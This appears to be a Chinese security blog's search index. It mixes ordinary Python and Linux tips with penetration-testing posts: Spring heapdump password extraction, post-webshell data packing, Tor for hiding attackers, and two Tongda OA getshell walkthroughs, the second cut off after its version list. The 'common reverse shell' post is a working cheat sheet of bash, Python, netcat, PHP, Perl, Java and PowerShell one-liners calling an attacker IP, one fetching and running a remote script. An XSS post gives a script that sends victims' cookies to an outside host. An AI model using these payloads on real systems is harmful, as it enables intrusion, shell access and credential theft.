<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>macOS下PyQt6图标icon无法显示</title>
    <url>/2021/PyQt6%E5%9B%BE%E6%A0%87.html</url>
    <content><![CDATA[<p>刚使用PyQt6时遇到图标无法显示问题，几番查询总算解决，直接看代码<a id="more"></a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PyQt6.QtCore <span class="keyword">import</span> QFile</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtGui <span class="keyword">import</span> QIcon, QPixmap</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtWidgets <span class="keyword">import</span> QApplication, QPushButton, QWidget</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyIcon</span><span class="params">(QWidget)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.setupGUI()  <span class="comment">#创建窗口</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setupGUI</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.setWindowTitle(<span class="string">'Icon'</span>)</span><br><span class="line">        self.resize(<span class="number">400</span>, <span class="number">200</span>)  <span class="comment">#设置窗口大小</span></span><br><span class="line">        <span class="comment"># self.setWindowIcon(QIcon('./alarm.svg')))</span></span><br><span class="line">        </span><br><span class="line">        button = QPushButton(QIcon(<span class="string">'./alarm.svg'</span>), <span class="string">'Click me'</span>, self)</span><br><span class="line">        button.setToolTip(<span class="string">"This is Click"</span>)</span><br><span class="line">        button.setGeometry(<span class="number">150</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">50</span>)  <span class="comment">#设置按钮坐标和大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    path = <span class="string">'./alarm.svg'</span></span><br><span class="line">    app.setWindowIcon(QIcon(QPixmap(path)))  <span class="comment"># MAC下程序图标是显示在程序坞中，切记!</span></span><br><span class="line"></span><br><span class="line">    form = MyIcon()</span><br><span class="line">    form.show()</span><br><span class="line"></span><br><span class="line">    sys.exit(app.exec())  <span class="comment">#退出主循环</span></span><br></pre></td></tr></table></figure>

<p>setWindowIcon是QApplication的方法，而不是QWidget的，所以使用app.setWindowIcon设置是对的<br>注意：<font color=red>在macOS下，图标是显示在程序坞中！！！</font>&gt;</p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>pip更换国内源</title>
    <url>/2021/python%E6%9B%B4%E6%8D%A2%E6%BA%90.html</url>
    <content><![CDATA[<h3 id="pip国内的一些镜像"><a href="#pip国内的一些镜像" class="headerlink" title="pip国内的一些镜像"></a>pip国内的一些镜像</h3><ul>
<li>阿里云 <a href="http://mirrors.aliyun.com/pypi/simple/?spm=a2c6h.12873639.0.0.22b62cdbVtYOZm" target="_blank" rel="noopener">http://mirrors.aliyun.com/pypi/simple/</a></li>
<li>中国科技大学 <a href="https://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="noopener">https://pypi.mirrors.ustc.edu.cn/simple/</a></li>
<li>豆瓣(douban) <a href="http://pypi.douban.com/simple/" target="_blank" rel="noopener">http://pypi.douban.com/simple/</a></li>
<li>清华大学 <a href="https://pypi.tuna.tsinghua.edu.cn/simple/" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple/</a></li>
<li>中国科学技术大学 <a href="http://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="noopener">http://pypi.mirrors.ustc.edu.cn/simple/</a></li>
</ul>
<p><u>提示：若担心安全问题可使用HTTPS加密源</u></p>
<h3 id="修改源的方法"><a href="#修改源的方法" class="headerlink" title="修改源的方法"></a>修改源的方法</h3><h4 id="临时使用："><a href="#临时使用：" class="headerlink" title="临时使用："></a>临时使用：</h4><p>Linux Mac Windows通用命令<a id="more"></a></p>
<p>可以在使用pip时在后面加上-i参数，指定pip源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install Openpyxl -i https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>

<p><u>注意：如果使用非HTTPS源，需加上–trusted-host参数</u><br>如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install django -i http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F; --trusted-host mirrors.aliyun.com</span><br></pre></td></tr></table></figure>

<h4 id="永久修改："><a href="#永久修改：" class="headerlink" title="永久修改："></a>永久修改：</h4><p><strong>Linux:</strong></p>
<p>修改pip.cof文件(没有就创建一个)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$HOME&#x2F;.config&#x2F;pip&#x2F;pip.conf</span><br></pre></td></tr></table></figure>

<p>修改内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>Mac:</strong></p>
<p>修改pip.conf文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$HOME&#x2F;Library&#x2F;Application Support&#x2F;pip&#x2F;pip.conf</span><br></pre></td></tr></table></figure>

<p>如果没有上面的目录,在如下目录创建 pip.conf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>Windows:</strong><br>修改 pip.conf 文件 (没有就创建一个)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%APPDATA%\pip\pip.ini</span><br></pre></td></tr></table></figure>

<p>修改内容如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>

<p><font color=green><u>若使用非HTTPS源需在文件中加入</u></font></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[install]</span><br><span class="line">trusted-host&#x3D;mirrors.aliyun.com</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>编程</category>
      </categories>
  </entry>
  <entry>
    <title>MAT 查找 spring heapdump中的密码明文</title>
    <url>/2020/spring.html</url>
    <content><![CDATA[<h3 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h3><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 号替换，以达到脱敏的效果。在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。</p>
<h3 id="二、查找方法："><a href="#二、查找方法：" class="headerlink" title="二、查找方法："></a>二、查找方法：</h3><p>使用 Eclipse Memory Analyzer 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> org.springframework.web.context.support.StandardServletEnvironment</span><br></pre></td></tr></table></figure>

<p>然后点击红色感叹号执行查询。如下图， spring boot 1.x 版本 heapdump 查询结果，最终结果存储在 java.util.Hashtable$Entry 实例的键值对中：</p>
<img src="../images/upload/2020110501.png" style="zoom: 33%;" />

<a id="more"></a>所以也可以用

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> java.util.Hashtable$Entry x <span class="keyword">WHERE</span> (toString(x.key).contains(<span class="string">"password"</span>))</span><br></pre></td></tr></table></figure>

<p>来查询。下图为 spring boot 2.x 版本 heapdump 查询结果，最终结果存储在 java.util.LinkedHashMap$Entry 实例的键值对中：</p>
<img src="../images/upload/2020110502.png" style="zoom: 33%;" />

<p>所以也可以用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> java.util.LinkedHashMap$Entry x <span class="keyword">WHERE</span> (toString(x.key).contains(<span class="string">"password"</span>))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>源码或文件打包</title>
    <url>/2020/%E6%BA%90%E7%A0%81%E6%88%96%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85.html</url>
    <content><![CDATA[<p>​        在我们拿下webshell的时候，想要获取数据或者源码往往会用菜刀或者蚁剑去打包，但是这个时候往往就会出现很多问题，列如打包失败，或者是打包得不完整等等。</p>
<p>这个时候如果对方是windows服务器的话，我们可以将winrar安装包中的winrar.exe或者本地装的<code>winrar.exe</code>上传过去</p>
<img src="../images/upload/winrar.jpg" style="zoom:50%;" />

<a id="more"></a>

<p>压缩盘下的data文件夹，并且命名为bak.rar  <code>winrar.exe a -ag -k -r -s -ibck c:/bak.rar c:/data/</code></p>
<p>压缩多个文件 <code>winrar a -ag -ibck bak.rar filename1 filename2 filename....</code></p>
<p>参数说明： <code>a</code> :备份所有文件； <code>-ag</code> :当创建压缩文件时，以格式“YYYYMMDDHHMMSS”附加当前日期字符串,文件名bakYYYYMMDDHHMMSS.rar； <code>-k</code> :锁定压缩文件； <code>-r</code>:备份目录和子目录； <code>-s</code> :创建固实压缩文件； <code>-ibck</code>:后台运行；</p>
<p><code>filename1</code>：要压缩的文件名，可以多个，也可用通配符`file*</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>Tor的使用与渗透测试</title>
    <url>/2020/tor%E4%BD%BF%E7%94%A8.html</url>
    <content><![CDATA[<p>Tor主要用来访问匿名网络也就是已<code>.onion</code>结尾的域名，当然也可访问某些正常的网站如google、twitter等，但并不推荐如此做；今天要说的是在渗透测试中如何利用Tor网络对目标进行渗透，防止被溯源和审查等，隐藏攻击者身份和IP地址</p>
<p>官方解释：<font color=green>Tor是一个您能运行在您的电脑上，保护您在互联网上安全的程序。 它会将您的通信在一个由多个中继站组成的分散网络内不断传递，这些中继站被来自世界各地的志愿者们运营，并以此来保护您：这阻止了某些人通过您访问了哪些网址来得知您的网络链接，也防止了您访问的网站获取您的地理位置。 这些由志愿者搭建的中继被成为 Tor 网络。</font><a id="more"></a></p>
<h3 id="0x01-访问Tor的方式"><a href="#0x01-访问Tor的方式" class="headerlink" title="0x01 访问Tor的方式"></a>0x01 访问Tor的方式</h3><hr>
<p>1、直接使用Tor Browser浏览器，内置Tor Project加上Firefox浏览器–<code>推荐</code></p>
<p>2、源码安装Tor Project，然后配合其它浏览器使用–<code>Geek</code></p>
<h3 id="0x02-安装Tor-Browser浏览器"><a href="#0x02-安装Tor-Browser浏览器" class="headerlink" title="0x02 安装Tor Browser浏览器"></a>0x02 安装Tor Browser浏览器</h3><hr>
<p>下载地址：<br>Windows：<code>https://www.torproject.org/dist/torbrowser/9.5.3/torbrowser-install-win64-9.5.3_zh-CN.exe</code></p>
<p>Mac  os：<code>https://www.torproject.org/dist/torbrowser/9.5.3/TorBrowser-9.5.3-osx64_zh-CN.dmg</code></p>
<p>之后的安装过程就和其它程序一样了，这里不在赘述</p>
<h3 id="0x03-安装Tor-Project"><a href="#0x03-安装Tor-Project" class="headerlink" title="0x03 安装Tor Project"></a>0x03 安装Tor Project</h3><hr>
<p>Mac OS：<code>brew install tor</code></p>
<p>Windows：<code>https://www.torproject.org/dist/torbrowser/9.5.3/tor-win32-0.4.3.6.zip</code></p>
<h3 id="0x04-Tor-配置文件"><a href="#0x04-Tor-配置文件" class="headerlink" title="0x04 Tor 配置文件"></a>0x04 Tor 配置文件</h3><hr>
<p>Mac OS:<br><code>/usr/local/Cellar/tor/</code> :Tor的安装路径<br><code>/usr/local/etc/tor/torrc</code>  :Tor的配置文件</p>
<p>Windows:<br><code>解压后的存放路径</code>  : Tor的安装路径<br><code>同路径下tor/torrc</code>  :Tor的配置文件</p>
<p>Mac：在下面路径<code>/usr/local/etc/tor</code>找到文件<code>torrc.sample</code>，拷贝一份命名为<code>torrc</code><br>Windows：双击tor.exe后会生成torrc文件，然后再编辑</p>
<p>常用配置的参数：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>Socks5Proxy</td>
<td>前置 Socks 代理端口</td>
<td></td>
</tr>
<tr>
<td>HTTPProxy</td>
<td>前置 HTTP 代理端口</td>
<td></td>
</tr>
<tr>
<td>HTTPSProxy</td>
<td>前置 HTTPS 代理端口</td>
<td></td>
</tr>
<tr>
<td>SocksProt</td>
<td>外部程序访问 Tor 的端口</td>
<td></td>
</tr>
<tr>
<td>MaxCircuitDirtiness</td>
<td>自动切换 ip 的时间间隔</td>
<td></td>
</tr>
</tbody></table>
<p>我的配置：</p>
<img src="../images/upload/tor1.png" style="zoom: 67%;" />

<h3 id="0x05-确认是否接入Tor网络"><a href="#0x05-确认是否接入Tor网络" class="headerlink" title="0x05 确认是否接入Tor网络"></a>0x05 确认是否接入Tor网络</h3><hr>
<p>启动Tor：</p>
<p>Mac：<code>tor</code> 命令<br>Windows：双击<code>tor.exe</code></p>
<p>配置Tor生成的本地代理</p>
<p><img src="../images/upload/tor2.png" alt=""></p>
<p>访问 <code>https://check.torproject.org/</code></p>
<img src="/Users/tbo/github/hexo/source/images/upload/tor4.png" style="zoom: 33%;" />

<h3 id="0x06-配合Burp-Suite使用"><a href="#0x06-配合Burp-Suite使用" class="headerlink" title="0x06 配合Burp Suite使用"></a>0x06 配合Burp Suite使用</h3><hr>
<p>在Burp Suite中配置tor本地代理地址，浏览器中配置bp的代理</p>
<p>User options-&gt;Connetctions</p>
<img src="../images/upload/tor3.png" style="zoom:50%;" />

<p>OK,可以开始使用了<br><img src="../images/upload/tor5.png" style="zoom:50%;" /></p>
<img src="../images/upload/tor6.png" style="zoom:50%;" />

<h3 id="0x07-最后"><a href="#0x07-最后" class="headerlink" title="0x07 最后"></a>0x07 最后</h3><p>使用Tor的注意事项⚠️：</p>
<p>1、<strong>请勿将您的手机在 Tor 上用于两步验证</strong><br>2、<strong>不要在 TOR 之外操作用户帐户</strong><br>3、<strong>不要发布有关您的任何个人信息</strong><br>4、<strong>不要通过 TOR 发送未加密的数据</strong><br>5、<strong>不要忘记删除 cookies 和本地网站数据</strong><br>6、<strong>请勿将 TOR 用于 Google 搜索</strong><br>7、<strong>不要在 TOR 上打开 HTTP 网站</strong><br>8、<strong>不要同时使用 Tor 和不使用 Tor 访问同一台服务器</strong></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>实现每日推送CVE漏洞</title>
    <url>/2020/CVE%E4%BF%A1%E6%81%AF.html</url>
    <content><![CDATA[<p><font color=green>随着安全工作的开展，关注查看每天的CVE漏洞成了安全从业人员的日常事项，你可能从公众号、朋友圈或其它漏洞平台获取漏洞信息， 但这些都不可能完全满足你想要的信息，比如你只关心tomcat、zabbix、fastjson等组件的漏洞，所以我开始想如何自动化的推送漏洞信息</font><a id="more"></a></p>
<h2 id="实现方法："><a href="#实现方法：" class="headerlink" title="实现方法："></a>实现方法：</h2><h3 id="1、获取CVE数据："><a href="#1、获取CVE数据：" class="headerlink" title="1、获取CVE数据："></a>1、获取CVE数据：</h3><p>可以爬取CVE官方网站每日公布的漏洞信息，但是当日漏洞没有漏洞定级和CVSS评分；而CVSS的评分需要NVD(美国国家漏洞数据库)，所以我这里直接选择使用NVD提供的api获取漏洞信息</p>
<p><img src="../images/upload/cve_01.png" alt=""></p>
<h3 id="2、漏洞信息过滤："><a href="#2、漏洞信息过滤：" class="headerlink" title="2、漏洞信息过滤："></a>2、漏洞信息过滤：</h3><p>获取的漏洞信息可能多可能少，而我们只需要获得想要的信息便可，比如只想获取2020-07-08号的高危漏洞情况</p>
<p><img src="../images/upload/cve_02.png" alt=""></p>
<h3 id="3、消息推送："><a href="#3、消息推送：" class="headerlink" title="3、消息推送："></a>3、消息推送：</h3><p>通过企业微信的api进行消息的推送<br><img src="../images/upload/cve_03.png" alt=""></p>
<h3 id="4、定时推送："><a href="#4、定时推送：" class="headerlink" title="4、定时推送："></a>4、定时推送：</h3><p>放在服务器上建立定时任务，比如每天上班前8:50推送消息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">50 08 * * * /usr/bin/python3 cve.py</span><br></pre></td></tr></table></figure>

<h3 id="5、效果展示："><a href="#5、效果展示：" class="headerlink" title="5、效果展示："></a>5、效果展示：</h3><p><img src="../images/upload/cve_04.jpg" alt=""></p>
<p><img src="../images/upload/cve_05.jpg" alt=""></p>
<h3 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h3><p>有些事情做起来没什么难度，但你的想法、思考很重要…获取源码方式，请公众号内回复’CVE’即可</p>
<hr>
<p>参考链接：</p>
<p><a href="https://nvd.nist.gov/General/News/New-NVD-CVE-CPE-API-and-SOAP-Retirement" target="_blank" rel="noopener">https://nvd.nist.gov/General/News/New-NVD-CVE-CPE-API-and-SOAP-Retirement</a><br><a href="https://work.weixin.qq.com/api/doc" target="_blank" rel="noopener">https://work.weixin.qq.com/api/doc</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>常见反向shell方法</title>
    <url>/2020/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%90%91shell.html</url>
    <content><![CDATA[<h2 id="常见反向shell生成与使用方法："><a href="#常见反向shell生成与使用方法：" class="headerlink" title="常见反向shell生成与使用方法："></a>常见反向shell生成与使用方法：</h2><p>​    如果目标存在命令/代码执行漏洞，可用此些方法获取shell。</p>
<h3 id="Bash："><a href="#Bash：" class="headerlink" title="Bash："></a>Bash：</h3><p>​    Attacker：nc  -lvvp  4444</p>
<p>​    Victimer：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i  &gt;&amp; /dev/tcp/Attacker_IP/4444  0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="Python："><a href="#Python：" class="headerlink" title="Python："></a>Python：</h3><p>​    Attacker：nc  -lvvp  4444</p>
<p>​    Victimer：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.1.130",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure>

<h3 id="Netcat-nc-："><a href="#Netcat-nc-：" class="headerlink" title="Netcat(nc)："></a>Netcat(nc)：</h3><p>​    如果目标机器存在nc且有-e参数，那么可以使用nc建立反向shell</p>
<p>​    Attacker：nc  -lvvp 4444</p>
<p>​    Victimer：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e  /bin/bash  Attacker_IP 4444</span><br></pre></td></tr></table></figure>



<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>​    Attacker：nc  -lvvp 4444</p>
<p>​    Victimer：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("172.16.1.130",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>

<h3 id="Java："><a href="#Java：" class="headerlink" title="Java："></a>Java：</h3><p>​    Attacker：nc  -lvvp 4444</p>
<p>​    Victimer ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/172.16.1.130/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<h3 id="Perl："><a href="#Perl：" class="headerlink" title="Perl："></a>Perl：</h3><p>​    Attacker：nc  -lvvp 4444</p>
<p>​    Victimer：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="172.16.1.130";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>

<h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>​    Attacker：nc  -lvvp 4444</p>
<p>​    Victimer：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">172.16</span>.<span class="number">1.130</span> <span class="literal">-port</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<h3 id="Xterm："><a href="#Xterm：" class="headerlink" title="Xterm："></a>Xterm：</h3><p>​    Victimer:  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xterm -display Attacker_IP:1</span><br></pre></td></tr></table></figure>

<p>​    Attacker:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Xnest :1</span><br><span class="line">xhost +Victimer_IP</span><br></pre></td></tr></table></figure>



<h3 id="Msfvenom连接一句话："><a href="#Msfvenom连接一句话：" class="headerlink" title="Msfvenom连接一句话："></a>Msfvenom连接一句话：</h3><p>msf支持多种反弹方式，比如exe ps php asp aspx甚至是ruby等，我们可以用msfvenom来生成payload，然后在msf中监听，执行之后就会反弹回来session。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 172.16.1.130</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>简易xss平台 获取Cookie</title>
    <url>/2020/xss%E8%8E%B7%E5%8F%96.html</url>
    <content><![CDATA[<p>1、启用python http服务器</p>
<img src="../images/upload/python3.png" style="zoom:67%;" />

<p>2、在有xss的地方插入截获代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">'&lt;img src="http://192.168.56.109/'</span>+<span class="built_in">document</span>.cookie+<span class="string">'" width=0 height=0 border=0 /&gt;'</span>);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>3、等待管理员触发漏洞后，便会截获到cookie</p>
<img src="../images/upload/cookie.png" style="zoom: 67%;" />]]></content>
  </entry>
  <entry>
    <title>linux 查看硬件架构|系统版本|内核版本</title>
    <url>/2020/linux%E7%89%88%E6%9C%AC.html</url>
    <content><![CDATA[<p><font color=green>有时候,我们可能需要获取Linux系统的一些关键信息,以下列举了部分常用的命令做为备忘📝</font></p>
<h3 id="一、查看系统架构"><a href="#一、查看系统架构" class="headerlink" title="一、查看系统架构"></a>一、查看系统架构</h3><ul>
<li><strong>hostnamectl</strong> 工具是用来管理给定主机中使用的三种类型的主机名，可以提供有关你的机器的最基本的信息。</li>
</ul>
<p><code>hostnamectl status</code></p>
<img src="../images/upload/hostnamectl.png" alt="hostnamectl" style="zoom:50%;" />

<a id="more"></a>

<ul>
<li><p><strong>lscpu</strong>命令从sysfs和/proc/cpuinfo收集cpu体系结构信息，命令的输出比较易读，命令输出的信息包含cpu数量，线程，核数，套接字等。</p>
<img src="../images/upload/lscpu.png" style="zoom:50%;" />
</li>
<li><p><strong>arch</strong>命令主要用于显示当前主机的硬件结构类型，arch命令输出的结果有：i386、i486、mips、alpha等。</p>
<img src="../images/upload/arch.png" style="zoom: 67%;" />
</li>
<li><p><strong>uname</strong>命令的英文全称即“Unix name”，用于显示系统相关信息，比如主机名、内核版本号、硬件架构等。<br>-m 显示计算机硬件架构；-i  显示硬件平台</p>
<img src="../images/upload/uname1.png" style="zoom: 67%;" />

</li>
</ul>
<h3 id="二、查看系统发行版本"><a href="#二、查看系统发行版本" class="headerlink" title="二、查看系统发行版本"></a>二、查看系统发行版本</h3><ul>
<li><p><strong>LSB</strong>是Linux Standard Base的缩写，lsb_release命令用来显示LSB和特定版本的相关信息。如果使用该命令时不带参数，则默认加上-v参数。</p>
<p>-d 显示系统全称和版本号；-a  显示LSB所有信息</p>
<img src="../images/upload/lsb_release.png" style="zoom:50%;" />
</li>
<li><p><strong>/etc/*-release</strong>文件通常被视为操作系统的标识。在 <code>/etc</code> 目录下放置了很多记录着发行版各种信息的文件，每个发行版都各自有一套这样记录着相关信息的文件。</p>
<p>其中 <code>/etc/redhat-release</code> 和 <code>/etc/system-release</code>,<code>/etc/os-release</code> 文件是指向 <code>/etc/[发行版名称]-release</code> 文件的一个连接。</p>
<img src="../images/upload/cat1.png" style="zoom:50%;" />

</li>
</ul>
<h3 id="三、查看内核版本"><a href="#三、查看内核版本" class="headerlink" title="三、查看内核版本"></a>三、查看内核版本</h3><ul>
<li><p><strong>uname</strong>用于显示系统相关信息，比如主机名、内核版本号、硬件架构等。</p>
<p>-r 显示当前系统的内核版本; -s 显示内核名称</p>
<img src="../images/upload/uname2.png" style="zoom: 67%;" />
</li>
<li><p><strong>/proc/version</strong>文件记录了 Linux 内核的版本、用于编译内核的 gcc 的版本、内核编译的时间，以及内核编译者的用户名。</p>
<p><img src="../images/upload/proc.png" alt=""></p>
</li>
<li><p><strong>dmesg</strong>（展示信息display message 或驱动程序信息driver message）是大多数类 Unix 操作系统上的一个命令，用于打印内核的消息缓冲区的信息。</p>
<p><img src="../images/upload/dmesg.png" alt=""></p>
</li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>通达OA 后台GetShell</title>
    <url>/2020/%E9%80%9A%E8%BE%BEOA3.html</url>
    <content><![CDATA[<h3 id="0x01-如何后台"><a href="#0x01-如何后台" class="headerlink" title="0x01 如何后台"></a>0x01 如何后台</h3><p>怎么进入后台随便你，可以利用前段时间的<code>任意用户登录漏洞</code></p>
<p><img src="../images/upload/loginadmin.png" alt="login"></p>
<a id="more"></a>

<h3 id="0x02-更改配置"><a href="#0x02-更改配置" class="headerlink" title="0x02 更改配置"></a>0x02 更改配置</h3><p>此处利用系统管理-&gt;附件管理📎</p>
<p><img src="../images/upload/fujian.png" alt="fujian"></p>
<p>此站点并未设置存储目录，点击添加目录</p>
<p><img src="../images/upload/fujian2.png" alt="fujian"></p>
<p>目录中要设置网站根目录，根目录可以通过系统管理-&gt;系统信息处获得</p>
<p><img src="../images/upload/fujian3.png" alt="gujian3"></p>
<p><img src="../images/upload/fujian4.png" alt="fujian4"></p>
<p>记得勾选<code>将所有新附件存该目录</code>，然后保存</p>
<p><img src="../images/upload/fujian5.png" alt="fujian5"></p>
<h3 id="0x03-上传附件"><a href="#0x03-上传附件" class="headerlink" title="0x03 上传附件"></a>0x03 上传附件</h3><p>通过组织下的聊天框，选中自己后发送任意附件，利用BurpSuite拦截</p>
<p><img src="../images/upload/fujian6.png" alt="fujian6"></p>
<p><img src="../images/upload/oa31.png" alt="oa31"></p>
<p><a href="../file/upshell.txt">上传附件 request.txt</a></p>
<p><img src="../images/upload/oa3.png" alt="oa3"></p>
<p><img src="../images/upload/oa32.png" alt="oa32"></p>
<p><img src="../images/upload/oa33.png" alt="oa33"></p>
<p><img src="../images/upload/oa34.png" alt="oa34"></p>
]]></content>
      <categories>
        <category>通达OA</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA 任意文件上传/文件包含GetShell</title>
    <url>/2020/%E9%80%9A%E8%BE%BEOA2.html</url>
    <content><![CDATA[<h3 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h3><p>攻击者可以绕过身份认证，上传任意文件，结合文件包含漏洞即可实现RCE。<br>影响版本包含：<br>文件上传：<br><code>V11版 &lt;= 11.3    20200103
 2017版 &lt;= 10.19  20190522
 2016版 &lt;= 9.13   20170710
 2015版 &lt;= 8.15   20160722
 2013增强版 &lt;=7.25 20141211
 2013版 &lt;= 6.20   20141017</code><a id="more"></a></p>
<p>文件包含：</p>
<p><code>V11版 &lt;= 11.3</code></p>
<h3 id="0x02-解密工具"><a href="#0x02-解密工具" class="headerlink" title="0x02 解密工具"></a>0x02 解密工具</h3><p>代码通过Zend加密处理，需对进行解密操作后获得可读性源码</p>
<ul>
